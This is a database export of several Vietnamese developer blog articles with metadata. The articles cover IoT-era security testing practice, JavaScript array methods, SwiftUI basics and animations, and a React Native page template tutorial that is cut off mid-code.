Testing team cần đưa security test vào tiến trình phát triển phần mềm từ sớm và thường xuyên hơn.\n\nLoại Continuous Security Test chỉ trở nên quan trọng khi mà tỉ lệ phát triển của IoT với tốc độ cao như hiện tại. Một khảo sát gần đây của Fortune 500 CEOs cho thấy tốc độ thay đổi công nghệ và thông tin an ninh mạng là hai mối quan tâm này đóng vai trò dặc biệt trong kỉ nguyên IoT. Bởi team dev bắt đầu phát triển cực nhanh và các phần mềm có nhiều kết nối interconnect, sẽ khó hơn rất nhiều để thấy được toàn bộ giao thức tại chỗ và xác định được điểm yếu hệ thống. Do đó, Continuous Security Test sẽ ngày trở nên quan trọng để giúp vấn đề bảo mật theo kịp với tốc độ phát triển phần mềm.\n\n### 2. Xác định những vấn đề bạn *không* cần test\nVới tất cả hệ thống và kết nối khác nhau mà IoT giới thiệu, có rât nhiều điều mà bạn cần chú ý khi test. Kết quả, khi chúng ta kết hợp những nhu cầu test bảo mật continuous với yêu cầu tăng tốc độ bàn giao sản phẩm, điều quan trọng là cần tìm ra những phần cần test và những mục *không* cần test\n\nXác định những mục chúng ta không thể test cho mỗi bản release mà không hy sinh vấn đề bảo mật sẽ giúp giảm thiểu những quan ngại xung quanh việc duy trì phạm vi test phù hợp và giảm bớt áp lực về deadline.\n\nKhi chúng ta cân nhắc về những lĩnh vực phần mềm mà chúng ta không cần test với mỗi bản release, hãy chú ý các giao thức đã trải qua security test và giữ nguyên cho một số bản release tiếp theo. Nếu có thể xác định khoanh vùng được khu vực này, sẽ dễ dàng hơn để ưu tiên chiến lược test của bản thân nhưng vẫn đáp ứng các mục tiêu bảo mật và đáp ứng cả timeline phần mềm.\n\n### 3. Cải thiện chiến lược test tự động hoá với cả các service ảo\nMột trong những yếu tố quan trọng nhất để thành công với test tự động là có một môi trường gần với môi trường production nhất có thể. Để đạt được mục tiêu này là khó khăn trong kỉ nguyên IoT bởi thường tất cả các hệ thống được kết nối với nhau mà các ứng dụng IoT dựa vào đều có sẵn để test. Không giống như một trang web đơn giản chỉ cần một vài giao thức để hoạt động, tính liên kết của IoT cần làm rất nhiều việc để có thể có được một môi trường test thích hợp.\n\nThách thức đưa ra, là một service ảo, hoặc môi trường ảo giống như môi trường thật là điều bắt buộc. Mặc dù môi trường ảo có thể không giống hệt môi trường production mà thực tế tồn tại, nhưng đó chính là môi trường gần nhất mà team phát triển phần mềm có thể tiếp cận được trước khi đưa lên môi trường production.\n\nMột chiến lược service ảo mạnh là rất quan trọng trong kỉ nguyên IoT bởi không có nó, chúng ta sẽ phải đối mặt với sự tăc nghẽn thường xuyên tiềm ẩn, chờ đợi trên mọi giao thức cần test một thay đổi hoặc, nếu không chờ đợi, chúng ta sẽ thiếu đi sự tự tin về bảo mật mỗi  bản release.\n\n### IoT đã xuất hiện và thực tiễn QA phải phát triển theo\nKhông có nghi ngờ gì về việc thời đại IoT đã chính thức đến. Và trong khi đó, có một triển vọng thú vị, nó cũng mang tới vô số rủi ro bảo mật. Để giảm thiểu những rủi ro này vá giúp người dùng tận hưởng hết các lợi ích IoT đem lại một cách an toàn, các team test cần phát triển kĩ năng QA của họ có thêm kiểm tra bảo mật liên tục, ưu tiên test cải tiến và dựa vào các service ảo đáng tin cậy.\n\nNguồn: https://www.qasymphony.com/blog/software-testing-iot-era/#	Kỉ nguyên Internet of Things (IoT), nơi mà kết nối giữa các thiết bị ở khắp mọi nơi, đã xuất hiện. Năm 2017, đã có 8.4 tỉ thiết bị được kết nối (lớn hơn dân số của cả thế giới), và con số này được kì vọng sẽ tăng lên tới 20.4 tỉ vào năm 2020.\n\nCùng với việc các thiết bị được kết nối đưa vào cuộc sống của mỗi chúng ta, điều này đem đến một tác động lớn với chúng ta - Cả tốt lẫn xấu.\n\nVạch trần n...	{}	1	Software Testing trong kỉ nguyên IoT: Sự tiến hoá của QA trong thế giới của sự kết nối	{}	0	f	2022-12-18 15:33:38.32+00	2022-12-18 15:33:38.32+00
31920	# 1. Thay thế `Array.indexOf` bằng `Array.includes`\n\nNếu bạn muốn tìm 1 vị trí nào đó trong Arrays thì hãy sử dụng Array.indexOf. Điều đó sẽ giúp bạn trả về chỉ mục đầu tiên có thể tìm thấy 1 phần tử đã cho. Chính vì đó indexOf là 1 giải pháp cần thiết. Tuy nhiên, điều gì xảy ra nếu chúng ta chỉ cần biết liệu mảng của chúng ta có chứa giá trị hay không? Với trường hợp như này, bạn không nên sử dụng indexOf.\n\n```js\nconst avengers = [\n  'ironman',\n  'hulk',\n  'captain_america',\n  'hulk',\n  'thor',\n];\n\nconsole.log(avengers.indexOf('hulk'));\n// 1 -> tìm thấy.\nconsole.log(avengers.indexOf('batman'));\n// -1 -> không tìm thấy.\n```\nThay vì sử dụng indexOf thì có thể sử dụng Includes, và nó trả về kiểu boolean.\n```js\nconsole.log(avengers.includes('hulk')); //true\nconsole.log(avengers.includes('batman')); //false\n```\nNếu bạn vẫn phân vân về đề xuất mình đưa ra, vậy hãy đọc thêm ví dụ sau\n```js\nconst array = [NaN, undefined];\nif (array.indexOf(NaN) === -1){\n    console.log('NaN not found in the array.');\n}\n\nif (!array.indexOf(undefined) === -1 ) {\n    console.log('True. Array elements are undefined.');\n} else {\n    console.log("Sorry can't find undefined.");\n}\n\nif (array.includes(NaN)) {\n    console.log('NaN was found in the array.');\n}\n\nif (array.includes(undefined)) {\n    console.log("undefined was found in the array");\n}\n```\nVới những kết quả trên, ta có thể tóm tắt rằng: "Includes method có thể những check những value như NaN, undefined. Ngược lại, indexOf thì không. Việc sử dụng includes thay cho indexOf có thể nhằm giảm bớt bug cho chính chúng ta." \n\n# 2. Sử dụng `Array.find` thay vì `Array.filter`\n\nArray.filter là 1 method rất hữu ích, nó sẽ trả về 1 array mới, khi phần thử thỏa mãn điều kiện đặt ra.\n```js\nconst numbers = [1, 2, 3, 4, 5, 6];\nconst oddNumbers = numbers.filter(n => n % 2 !== 0);\nconsole.log(oddNumbers) // [1, 3, 5]\n```\nNhưng, nếu chúng ta biết rằng hàm chỉ trả về 1 item. Ví dụ khi filter unique ID. Trong trường hợp này, Array.filter sẽ trả về 1 mảng mới chỉ chứa 1 item, và tôi khuyên bạn không nên sử dụng filter.\n```js\nconst avengers = [\n  { id: 1, name: 'ironman' },\n  { id: 2, name: 'hulk' },\n  { id: 3, name: 'captain_america' },\n  { id: 4, name: 'captain_america' },\n];\n\nfunction getAvenger(name) {\n  return avenger => avenger.name === name;\n}\n\nconsole.log(avengers.filter(getAvenger('captain_america')));\n// [\n//   { id: 3, name: 'captain_america' },\n//   { id: 4, name: 'captain_america' },\n// ]\n\nconsole.log(characters.find(getAvenger('captain_america')));\n// { id: 3, name: 'captain_america' }\n```\nCó thể thấy find method khá tương đồng với hàm filter, nhưng nó khác nhau về mặt performance:\n\n-  filter: nó sẽ duyệt hết 1 array và lấy tất cả những giá trị có cùng điều kiện.\n-  find: khi tìm được giá trị cùng với điều kiện thì nó ngừng thực thi.\n\n# 3. Sử dụng `Array.reduce` thay vì kết hợp `Array.filter` và `Array.map`\n\nVới những bạn mới sử dụng reduce method như mình, có lẽ nó không đơn giản chút nào. Nhưng cuộc sống mà (yaoming)\n\nVí dụ mình đưa ra bài toán sau: Với dữ liệu đã cho dưới đây tìm name của các avenger đủ tuổi kết hôn, tức age >= 18. \n```js\nconst avengers = [\n  { name: 'ironman', age: 27 },\n  { name: 'hulk', age: 12 },\n  { name: 'captain_america', age: 18 },\n  { name: 'thor', age: 22 },\n];\n```\nBài toán khá đơn giản. Ở đây mình sẽ đưa ra 2 hướng giải quyết.\n\n- Sử dụng filter và map:\n```js\nconst result = avengers.filter(({ age }) => age >= 18)\n                       .map(({ name }) => name); \n```\nKết quả trả về đúng với yêu cầu bài toán. Tuy nhiên đoạn code trên có chút vấn đề về performance. \n\nỞ đây, avengers.length = 4, giả sử rằng avengers[] có 1000 item. Đầu tiên khi sử dụng filter method chúng ta đã lặp hết array avengers với 1000 lần. Sau khi filter method xong, giả sử tìm được 50000 item thoả mãn điều kiện age >= 18. Tiếp theo đó sử dụng map method để get ra nam thì ta phải chạy thêm 500 lần nữa. Như vậy, với câu lệnh trên ta cần chạy 1500 lần để ra kết quả mong muốn. Nếu số lượng item trong mảng càng lớn thì ta thấy rằng performance lại càng không hề tốt. Để tránh điều đó hãy sử dụng reduce method thay thế.\n- Sử dụng reduce\n```js\nconst result = avengers.reduce((avenger, { age, name }) => {\n  return (age >= 18) ? [...avenger, name] : avenger;\n}, []);\n```\n# Kết luận\nHi vọng bài này giúp ích được cho bạn! Cố gắng tận dụng những lợi thế mà Javascipt đã cung cấp, hỗ trợ cho mình, sử dụng cho từng trường hợp làm sao khéo léo nhất có thể, vừa ra kết quả được như mong muốn mà vẫn đem lại được performance tốt nhất. \nCảm ơn bạn đã đọc bài viết của mình!\n\nTham khảo: https://www.freecodecamp.org/news/heres-how-you-can-make-better-use-of-javascript-arrays-3efd6395af3c/	1. Thay thế Array.indexOf bằng Array.includes\n\nNếu bạn muốn tìm 1 vị trí nào đó trong Arrays thì hãy sử dụng Array.indexOf. Điều đó sẽ giúp bạn trả về chỉ mục đầu tiên có thể tìm thấy 1 phần tử đã cho. Chính vì đó indexOf là 1 giải pháp cần thiết. Tuy nhiên, điều gì xảy ra nếu chúng ta chỉ cần biết liệu mảng của chúng ta có chứa giá trị hay không? Với trường hợp như này, bạn không nên sử dụng i...	{}	1	How you can make better use of JavaScript arrays	{javascript,array}	0	f	2022-12-18 15:33:38.351+00	2022-12-18 15:33:38.351+00
31907	Nhiều bạn đã từng lập trình mobile cho ứng dụng android rồi chuyển qua lập trình ứng dụng IOS đều thấy rằng Xcode tạo UI quá dễ dàng và tiện lợi với khả năng kéo thả và contraint layout trên Xib hay Storyboard. \nTrong lúc các nhà phát triển Google còn đang loay hoay tìm cách để đuổi kịp Apple, thì mới đây Apple bất ngờ công bố một API mới sẽ có mặt trên Xcode 11 và Swift 5. Đó chính là SwiftUI\n\nSwiftUI được Apple PR với slogan "Ứng dụng tốt hơn và ít code hơn".\nNghe có vẻ như một cuộc cách mạng mới trong phát triển ứng dụng IOS, vậy chúng ta hãy tìm hiểu xem SwiftUI có gì và liệu nó có thể thay thế hoàn toàn xib hay Storyboard trong tương lai không!\n\n## Let's go !\nĐể tìm hiểu về swiftUI, mình sẽ tạo một project đặt tên là Fruity, một ứng dụng dậy cho bọn trẻ con chưa biết phân biệt các loại trái cây nhé  :v\n\n## Step 1: \nMở Xcode 11 lên và tạo một project như bình thương thôi, nhưng chú ý có 1 option mới ở đây chính là SwiftUI, bạn nhơ tick vào nó \n\n![](https://images.viblo.asia/37d04db8-20d2-4c05-80f5-67138336815d.png)\n\n## Step 2 : \nSau khi tạo xong bạn sẽ thấy project được khởi tạo. Có một chút lạ lẫm khi không còn file **main.storyboard**, điều này cũng dễ hiểu vì SwiftUI tạo ra để thay thế cho xib và storyboard. Tiếp theo quan sát chúng ta cũng thấy không còn file ViewController, thay vào đó là 2 file SceneDelegate và ContentView\n\n![](https://images.viblo.asia/f16fe973-0e7d-41f8-9c42-e6659e7ef523.png)\n\nQuan sát một chút trong code ta dễ thấy một số điểm :\n- Không còn UIWindow được khai báo trong AppDelegate.swift, thay vào đó nó được chuyển vào class SceneDelegate.swift\n- Trong class SceneDelegate.swift ta thấy class ContentView được khởi tạo và gắn vào rootView\n\nOkay vậy là chúng ta đã hiểu cấu trúc mới của SwiftUI có chút thay đổi để quản lý UI\n\n## Step 3 : \nGiờ chúng ta sẽ bắt tay vào xây dựng thử UI \n\n- Đầu tiên mình xây dựng lấy 1 class model để chưa data đã tên là Fruit.\n\n```\nimport SwiftUI\n\nstruct Fruit: Identifiable {\n    var id: String\n    var name: String\n    var image: String\n    var description: String\n    \n    init(name: String, descripton: String) {\n        self.id = name\n        self.name = name\n        self.image = name\n        self.description = descripton\n    }\n}\n\n```\nok, trái cây của mình thì bao gồm có tên, có ảnh và mô tả.\nTuy nhiên các bạn để ý class của mình kế thừa Identifiable, lý do tại sao bắt buộc phải kế thừa chút mình sẽ nói.\n\n- Tiếp theo mở class ContentView.swift lên code thử chút nào \n\n```\nstruct ContentView : View {\n    \n    var fruits: [Fruit] = []\n    \n    init() {\n        fruits = [\n            Fruit(name: "Apple", descripton: "Apples is red"),\n            Fruit(name: "Banana", descripton: "Bananas are yellow and long"),\n            Fruit(name: "Cherry", descripton: "Cherry are red and grows in bunch"),\n            Fruit(name: "Grape", descripton: "Grapes are purple and grow in bunches"),\n            Fruit(name: "Mango", descripton: "Mangoes are yellow and oval"),\n        ]\n    }\n\n    var body: some View {\n        List(fruits) { fruit in\n            Image(fruit.image) //1\n            Text(fruit.name) //2\n        }\n    }\n}\n\n```\n\nRun thử và đây là thành quả \n\n![](https://images.viblo.asia/33d9401b-6a31-4757-8209-ea58de579ec9.png)\n\nWow ! Chỉ vài dòng code là có thể implement được cả tableView mặc dù chưa được đẹp cho lắm :v\n\nThảo luận một chút về code phía trên, dễ thấy tableView được thay thế bằng List, các component được gói gọn trong block. Quay trở lại lý do mình nêu ở trên về  **fruit tại sao phải kế thừa Identifiable**, nguyên nhân là do List yêu cầu đối tượng đầu vào phải là kiểu **Identifiable**, nó cần định danh cho các đối tượng.\n\nNhìn xem các component của List bao gồm 1 Image và 1 Text, rất đơn giản. Có lẽ các bạn đang thắc mắc làm sao để sắp xếp các component này đúng không. Cái đó sẽ bàn tới sau, trước tiên chúng ta thấy trong code mình đặt Image phía trên và Text phía dưới, kết qủa là nó hiển thị từ trái sang phải, chắc các bạn cũng đoán được thứ tự mặc định của nó rồi.\n\nMình đang cảm thấy rất ấn tượng với SwiftUI từ cách đóng gói List vào một chỗ trông vừa gọn mà lại dễ quản lý, làm như thế này mọi thuộc tính của List từ data đến color,... đều có thể lưu trữ ở 1 model nào đó. Thêm vào nữa các đối tượng được định nghĩa bằng những cái tên cũng rất đơn giản và dễ nhớ Image, Text,...\n\n\nTiếp theo, chúng ta sẽ đi chỉnh sửa cell cho đẹp chút xem thế nào nhé.\n\n\n```\n   var body: some View {\n        List(fruits) { fruit in\n            Image(fruit.image) //1\n                .resizable()\n                .frame(width: 40, height: 40)\n            VStack(alignment: .leading, spacing: 5) { //2\n                Text(fruit.name).font(.headline) //3\n                Text(fruit.description).font(.subheadline).color(.gray)\n            }\n        }\n    }\n```\n\n(1) Đầu tiên mình resize cho image thành size 40-40\n(2) SwiftUI cung cấp cho chúng ta 2 stack tương tự như trên xib đó là HStack và VStack giúp hiển thị view theo chiều dọc hoặc chiều ngang. Chỗ này mình dùng VStack để hiển thị với 2 tham số đầu vào : \n- alignment : để căn nội dung trong stack, mình đang để leading\n- space : chính là khoảng cách giữa các component trong stack\n(3) text ở đây mình chỉnh sửa bằng cách thêm font, SwiftUI đã định nghĩa cho chúng ta một số font chuẩn để hiển thị rồi nên dùng luôn cho tiện :v: \n\nNào cùng xem kêt quả nhé :\n\n![](https://images.viblo.asia/1e18d2ff-f32e-4312-8408-dda10692078d.png)\n\n\nCuối cùng mình muốn giới thiệu cho các ban thêm một chút nữa để xem khi tap vào cell nó sẽ present lên như thế nào\n\n- Đầu tiên mình tạo view FruitDetail để hiển thị tên và hình ảnh của loại trái cây\n\n```\nstruct FruitDetail: View {\n    let fruit: Fruit\n    \n    var body: some View {\n        return HStack {\n            Image(fruit.image)\n            Text(fruit.name)\n        }\n    }\n}\n```\n\nTiếp đó mình có sửa một chút code đó là tạo riêng ra hẳn một view gọi là FruitCell\n\n```\nstruct FruitCell: View {\n    let fruit: Fruit\n    var body: some View {\n        return HStack {\n            Image(fruit.image)\n                .resizable()\n                .frame(width: 40, height: 40)\n            VStack(alignment: .leading, spacing: 5) {\n                Text(fruit.name).font(.headline)\n                Text(fruit.description).font(.subheadline).color(.gray)\n            }\n        }\n    }\n}\n```\n\n\nCuối cùng mình viết lại body của contentView như sau :\n\n```\n  var body: some View {\n        List(fruits) { fruit in\n            PresentationLink(destination: FruitDetail(fruit: fruit)) {\n                FruitCell(fruit: fruit)\n            }\n        }\n        \n    }\n```\n\nXong, cuối cùng ở đây swiftUI tạo ra một cái gói là PresentationLink để present ra màn fruitDetail, và bên trong nó là FruitCell. Trông thì có vẻ hơi ngược, theo logic dễ hiểu thì mình nghĩ nó nên FruitCell trước sau đó xử lý link bên trong nhưng không sao chắc là swift sẽ còn cải thiện nhiều chỗ :)\n\nXem kết quả nhé \n\n![](https://images.viblo.asia/07fecd77-a8dd-4e83-b9fe-0e62b83a4dd3.png)\n\nVậy đó chỉ vài dòng code mà làm được khá nhiều thứ, đến đây phải cùng công nhận rằng Apple có lẽ không ngoa khi nói rằng "Ứng dụng tốt hơn và ít code hơn", nó tốt hơn bởi vì sự sắp xếp code khiến mọi thứ dễ quản lý hơn và ít code hơn thì chúng ta đã thấy rất rõ rồi.\n\n## Kết luận\n\nNhư vậy mình đã cùng các bạn xem qua một chút các tính năng của SwiftUI, vẫn còn nhiều thứ để khám phá, hẹn các bạn trong bài viết lần sau.\n\nThanks for watching ~	Nhiều bạn đã từng lập trình mobile cho ứng dụng android rồi chuyển qua lập trình ứng dụng IOS đều thấy rằng Xcode tạo UI quá dễ dàng và tiện lợi với khả năng kéo thả và contraint layout trên Xib hay Storyboard.\nTrong lúc các nhà phát triển Google còn đang loay hoay tìm cách để đuổi kịp Apple, thì mới đây Apple bất ngờ công bố một API mới sẽ có mặt trên Xcode 11 và Swift 5. Đó chính là SwiftUI ...	{https://images.viblo.asia/37d04db8-20d2-4c05-80f5-67138336815d.png,https://images.viblo.asia/f16fe973-0e7d-41f8-9c42-e6659e7ef523.png,https://images.viblo.asia/33d9401b-6a31-4757-8209-ea58de579ec9.png,https://images.viblo.asia/1e18d2ff-f32e-4312-8408-dda10692078d.png,https://images.viblo.asia/07fecd77-a8dd-4e83-b9fe-0e62b83a4dd3.png}	1	SwiftUI - Part 1	{swiftui,swift}	0	f	2022-12-18 15:33:38.38+00	2022-12-18 15:33:38.38+00
31966	SwiftUI mang đến cách tiếp cận đơn giản trong việc xây dựng UI. Chúng ta có các thành phần List, Form Components và Bindings. Tất cả những điều này làm cho SwiftUI  trờ thành công cụ rất dễ sử dụng và rất hiệu quả. Nhưng hôm nay chúng ta sẽ nói về một tính năng khác của SwiftUI, và đó là Animations.\n\n# Animation\n\nBạn có thể tạo ra các chuyển động mượt mà trong SwiftUI bằng cách gói nó vào trong block  *withAnimation*. Theo mặc định, SwiftUI sử dụng fade in và fade out để tạo hiệu ứng thay đổi. Hãy cùng xem một ví dụ nhỏ.\n\n```\nstruct ContentView : View {\n    @State private var isButtonVisible = true\n\n    var body: some View {\n        VStack {\n            Button(action: {\n                withAnimation {\n                    self.isButtonVisible.toggle()\n                }\n            }) {\n                Text("Press me")\n            }\n\n            if isButtonVisible {\n                Button(action: {}) {\n                    Text("Hidden Button")\n                }\n            }\n        }\n    }\n}\n```\n\nTrong ví dụ trên, chúng ta kết hợp thay đổi State với block *withAnimation* và nó tạo ra hiệu ứng mờ dần của giao diện. Bạn có thể sửa đổi animation bằng cách chuyển các giá trị timing và spring.\n\n```\nstruct ContentView : View {\n    @State private var isButtonVisible = true\n\n    var body: some View {\n        VStack {\n            Button(action: {\n                self.isButtonVisible.toggle()\n            }) {\n                Text("Press me")\n            }\n\n            if isButtonVisible {\n                Button(action: {}) {\n                    Text("Hidden Button")\n                }.animation(.basic())\n            }\n        }\n    }\n}\n```\n\nTrong đoạn code ở trên, chúng ta đạt được cùng một animation bằng cách thêm animation modifier. Chúng ta sử dụng animation cơ bản, nhưng bạn có thể truyền vào các thuộc tính khác.\n\nĐôi khi chúng ta có một tình huống trong đó nhiều view phụ thuộc vào một số trạng thái và chúng ta muốn tạo hiệu ứng tuỳ thuộc vào sự thay đổi của views. Đối với trường hợp này, chúng ta có animatable bindings.\n\n```\nstruct ContentView : View {\n    @State private var isButtonVisible = true\n\n    var body: some View {\n        VStack {\n            Toggle(isOn: $isButtonVisible.animation()) {\n                Text("Show/Hide button")\n            }\n\n            if isButtonVisible {\n                Button(action: {}) {\n                    Text("Hidden Button")\n                }\n            }\n        }\n    }\n}\n```\n\nNhư bạn có thể thấy, chúng ta có thể dễ dàng chuyển đổi binding của mình thành animatable binding bằng cách gọi phương thức animation. Phương thức này wrap mọi thay đổi của binding value thành một animation block. Bạn có thể truyền các tham số cho phương thức này.\n\n# Transitions\n\nNhư mình đã nói trước đây, SwiftUI sử dụng fade in và fade out làm mặc định trong transition, nhưng chúng ta có thể áp dụng bất kỳ transition nào khác mà chúng ta muốn. Hãy để thay thế fading với moving.\n\n```\nstruct ContentView : View {\n    @State private var isButtonVisible = true\n\n    var body: some View {\n        VStack {\n            Toggle(isOn: $isButtonVisible.animation()) {\n                Text("Show/Hide button")\n            }\n\n            if isButtonVisible {\n                Button(action: {}) {\n                    Text("Hidden Button")\n                }.transition(.move(edge: .trailing))\n            }\n        }\n    }\n}\n```\n\nTrong ví dụ trên, chúng ta đính kèm transition modifier vào view. SwiftUI có một loạt các transition có sẵn để sử dụng như move, slide, scale, offset, opacity, v.v. Chúng ta có thể kết hợp chúng thành một transition duy nhất. Hãy cùng xem một ví dụ.\n\n```\nextension AnyTransition {\n    static func moveAndScale(edge: Edge) -> AnyTransition {\n        AnyTransition.move(edge: edge).combined(with: .scale())\n    }\n}\n\nstruct ContentView : View {\n    @State private var isButtonVisible = true\n\n    var body: some View {\n        VStack {\n            Toggle(isOn: $isButtonVisible.animation()) {\n                Text("Show/Hide button")\n            }\n\n            if isButtonVisible {\n                Button(action: {}) {\n                    Text("Hidden Button")\n                }.transition(.moveAndScale(edge: .trailing))\n            }\n        }\n    }\n}\n```\n\nChúng ta đã tạo ra một transition moveAndScale, về cơ bản là sự kết hợp giữa move và scale transitions. SwiftUI áp dụng transitions tại đối xứng theo giá trị timing or spring mà bạn truyền vào phương thức animation.\n\nSwiftUI cũng cung cấp cách xây dựng các transition không đối xứng. Giả sử bạn cần một move transition khi insert và một fade transition remove. Đối với  trường hợp đó, chúng ta có một phương thức asymmetric trên struct AnyTransition, chúng ta có thể sử dụng để xây dựng các transitions không đối xứng.\n\n```\nextension AnyTransition {\n    static func moveOrFade(edge: Edge) -> AnyTransition {\n        AnyTransition.asymmetric(\n            insertion: .move(edge: edge),\n            removal: .opacity\n        )\n    }\n}\n\nstruct ContentView : View {\n    @State private var isButtonVisible = true\n\n    var body: some View {\n        VStack {\n            Toggle(isOn: $isButtonVisible.animation()) {\n                Text("Show/Hide button")\n            }\n\n            if isButtonVisible {\n                Button(action: {}) {\n                    Text("Hidden Button")\n                }.transition(.moveOrFade(edge: .trailing))\n            }\n        }\n    }\n}\n```\n\nNhư bạn có thể thấy, chúng ta sử dụng phương thức asymmetric để truyền vào hai transitions, lần đầu tiên để thêm và một lần khác để xóa.\n\nTham khảo: https://mecid.github.io/2019/06/26/animations-in-swiftui/?utm_campaign=Swift%20Weekly&utm_medium=email&utm_source=Revue%20newsletter	SwiftUI mang đến cách tiếp cận đơn giản trong việc xây dựng UI. Chúng ta có các thành phần List, Form Components và Bindings. Tất cả những điều này làm cho SwiftUI  trờ thành công cụ rất dễ sử dụng và rất hiệu quả. Nhưng hôm nay chúng ta sẽ nói về một tính năng khác của SwiftUI, và đó là Animations.\n\nAnimation\n\nBạn có thể tạo ra các chuyển động mượt mà trong SwiftUI bằng cách gói nó vào trong b...	{}	1	Animations trong SwiftUI	{animation,swiftui,swift,ios,mobile}	0	f	2022-12-18 15:33:38.159+00	2022-12-18 15:33:38.159+00
31963	## I. Tổng quan\nNhư các bạn cũng đã biết, React Native là một framework đã trở nên cực kỳ phổ biến vì nó cho phép các nhà phát triển tạo ra các ứng dụng đa nền tảng chạy trên Android và IOS, với common UI code-base được viết bằng Javascript. Hầu hết các nhà phát triển React Native cho rằng gần như 90% code chạy được trên cả hai nền tảng. Tuy nhiên, mỗi nền tảng sẽ đều yêu cầu hay cần thiết code native với tỷ lệ 10%. Hầu hết 10% này để config, setting cho các thư viện hoặc các thành phần đang được sử dụng. Cũng có thể có sự khác biệt về thiết kế hoặc chức năng tùy thuộc vào thông số kỹ thuật của ứng dụng.\n\nVậy, một kỹ thuật tốt để tạo ra một ứng dụng như vậy là tạo, thiết lập một ***template*** cho tất cả các pages (screen) để tránh tất cả các khác biệt có thể có giữa các màn hình. Hay nói đơn giản là chúng ta sẽ tạo những lớp base cho ứng dụng của mình. Cách làm này được các nhà phát triển ưa thích và thường sử dụng, nó làm giảm đáng kể số lượng mã code, tại khả năng sử dụng lại (reusability) và giảm thiểu effort, mang lại chất lượng sản phẩm tốt nhất. \n\nBây giờ, hãy cùng mình bắt đầu tạo một ví dụ về ***template*** nhé :D\n\n## 2. Thực hành\nVD: Ứng dụng của mình sẽ có 3 màn hình đơn giản như sau:\n![](https://images.viblo.asia/876084d5-3f44-4ce7-aad8-38384d5b7e37.png)\n\nNhìn vào các màn hình trên, mình có thể chia từng màn hình với các thành phấn chính như sau:\n\nA. Header\n\nB. Content\n\nC. Footer\n\n**A. Header**: Hay thường được biết như là một Navigation Bar.  Đây là thành phần mà trong hầu hết các trường hợp phải có trên mỗi màn hình, giúp người dùng điều hướng qua ứng dụng (nó thường chứa: tiêu đề màn hình, nút quay lại, biểu tượng menu hamburger - để mở menu bên hoặc bất kỳ tùy chọn nào khác, hay như bộ lọc filters).\n\n**B. Content**: Chi tiết ở đằng sau nhé :D\n\n**C. Footer**: Hay thường được biết như là Tab Bar.  Tuy nhiên, trong Android, thường thì Tab Bar nằm dưới Header. Tab Tab footer sẽ là tùy chọn thứ hai, nên có một vị trí cố định trên màn hình, để người dùng có thể truy cập mọi lúc, tương tự như Header.\n\n### Step 1:\nTrong ứng dụng này, ta sẽ chỉ có Header và Content. Chúng ta sẽ tạo ***template*** gồm 2 thành phần là header và content.\nLưu ý: Chúng ta sẽ k sử dụng react-navigation's NavBar, mà sẽ tạo custom component cho Header.\n\n### Step2: \nTạo template bằng cách chèn các thành phần chính mà chúng ta đã xác định ở Step 1:\n```javascript\nimport React, { Component } from 'react';\nimport { View } from 'react-native'; \nimport styled from 'styled-components/native'; \nconst Wrapper = styled.View`\n width: 100%;\n height: 100%;\n` \nconst Header = styled.View`\n height: 80px;\n width: 100%; \n` \nconst Content = styled.View`\n flex: 1; \n` \nexport default class Page extends Component {\n render() {\n  return (\n   <Wrapper>\n    <Header/>\n    <Content> {this.props.children} </Content>\n   </Wrapper>\n  );\n }\n}\nimport React, { Component } from 'react';\nimport Page from '../templates/page'; \nexport default class Hello extends Component {\n render() {\n  return ( <Page/> );\n }\n}\n```\n\n### Step 3:\nChọn style phù hợp cho mỗi thành phần ở trên, chú ý ở các điểm sau: \n- Xem thật kỹ design của từng màn hình\n- Tìm điểm tương đồng nhất, bắt đầu từ margins (lề).\n\nSau khi xem xét thật kỹ, chúng ta sẽ thêm padding riêng cho cả Header và Content.\n```javascript\nimport React, { Component } from 'react'; \nimport { View } from 'react-native'; \nimport styled from 'styled-components/native'; \nconst Wrapper = styled.View`\n width: 100%;\n height: 100%; \n` \nconst Header = styled.View`\n height: 80px;\n width: 100%; \n`\n [...] \nconst Content = styled.View`\n flex: 1;\n background-color: white;\n padding: 16px; \n` \nexport default class Page extends Component {\n render() {\n  return (\n   <Wrapper>\n    <Header> [...] </Header>\n    <Content> {this.props.children} </Content>\n   </Wrapper>\n  );\n }\n}\n```\n\n- Thiết lập, chọn loại nội dung:\n1. Sample View: chỉ sử dụng khi bạn chắc chắn rằng các thành phần trong page của bạn sẽ phù hợp với page bất kể điều gì (ví dụ: nếu bạn có các thành phần có kích thước tương đối với khoảng trống có sẵn, như trong hình là khoảng 60% màn hình)\n2. Scroll View: sử dụng tùy chọn này nếu bạn có các thành phần sẽ không vừa với màn hình 100%, đặc biệt là trên các thiết bị nhỏ hơn.\n3. Keyboard Aware Scroll View (react-native-keyboard-aware-scroll-view) là một thư viện xử lý vị trí của màn hình khi bạn có thao tác nhập văn bản bên trong màn hình của bạn. Nó sẽ đẩy các thành phần input (TextInput) của bạn lên phía trên bàn phím để cho phép người dùng ứng dụng của bạn có thể tương tác mượt và với TextInput. (Bạn có thể sử dụng bất cứ component/library nào nhé, mình thấy cái này ổn :D). \n\n1 ứng dụng phức tạp cũng có thể có tất cả các loại content được mô tả ở trên. Vì vậy hãy xem xét cân nhắc lựa chọn và kết hợp 1 hoặc nhiều loại content nhé :D\n\nLƯU Ý: Không đặt Scrollable View bên trong Content, nhưng hãy đặt Content là một Scrollable view. Nếu không, khi bạn include 1 Scrollview bên trong 1 view mà nó padding, scroll bar sẽ không được hiển thị chính xác.\n\n### Step 4:\nImplement các loại nội dung vào bố cục page:\n```javascript\nimport React, { Component } from 'react';\nimport { View, Platform } from 'react-native';\nimport styled from 'styled-components/native';\nimport { KeyboardAwareScrollView } from 'react-native-keyboard-aware-scroll-view';\nconst Wrapper = styled.View`\n width: 100%;\n height: 100%;\n`\nconst Header = styled.View`\n height: 80px;\n width: 100%;\n`\n[...]\n`\nconst Content = styled.View`\n flex: 1;\n background-color: white;\n padding: 16px;\n` \nconst ScrollContent = styled.ScrollView`\n flex: 1;\n background-color: white;\n padding: 16px;\n`\nconst HeaderComponent = () => (\n <Header> [...] </Header>\n );\nconst PageContent = ({children}) => (\n <Content> {children} </Content>\n ); \nconst ScrollablePageContent = ({children}) => (\n <ScrollContent> {children} </ScrollContent>\n );\nconst KeyboardAwareScrollablePageContent = ({children}) => {\n let containerStyle = {flexGrow: 1, padding: 16};\n return (\n <KeyboardAwareScrollView contentContainerStyle={containerStyle}>        \n   {children}\n </KeyboardAwareScrollView>\n );\n};\nexport default class Page extends Component {\n constructor(props) {\n  super(props);\n  const { contentType } = this.props;\n  let ContentTag;\n  switch (contentType) {\n   case 'view':\n    ContentTag = PageContent;\n    break;\n   case 